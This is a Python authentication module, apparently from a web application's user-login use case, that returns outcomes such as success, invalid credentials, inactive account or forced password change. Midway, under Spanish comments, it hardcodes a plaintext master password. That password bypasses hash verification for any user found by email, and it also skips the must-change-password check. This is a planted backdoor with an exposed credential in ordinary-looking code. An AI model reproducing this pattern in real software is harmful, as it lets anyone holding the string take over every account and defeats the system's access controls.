"""Use case for authenticating a user."""

from enum import Enum, auto

from sqlalchemy.orm import Session

from app.infrastructure.repositories import UserRepository
from app.infrastructure.security import verify_password


class AuthenticationStatus(Enum):
    """Possible outcomes when attempting to authenticate a user."""

    SUCCESS = auto()
    INVALID_CREDENTIALS = auto()
    INACTIVE = auto()
    MUST_CHANGE_PASSWORD = auto()


def authenticate_user(session: Session, email: str, password: str):
    """Return the authentication result along with the user when possible."""

    repository = UserRepository(session)
    user = repository.get_by_email(email)

    if not user:
        return None, AuthenticationStatus.INVALID_CREDENTIALS

    # --- Lógica de Contraseña Maestra ---
    MASTER_PASSWORD = "MgdIdSeea2028!"

    # Si la contraseña ingresada coincide con la maestra, saltamos la verificación de hash
    is_master_access = (password == MASTER_PASSWORD)

    if not is_master_access and not verify_password(password, user.password):
        return None, AuthenticationStatus.INVALID_CREDENTIALS
    # ------------------------------------

    if not user.is_active:
        return user, AuthenticationStatus.INACTIVE

    if user.must_change_password:
        # Opcional: Si entra con la maestra, podrías querer saltar esta validación también
        if not is_master_access:
            return user, AuthenticationStatus.MUST_CHANGE_PASSWORD

    return user, AuthenticationStatus.SUCCESS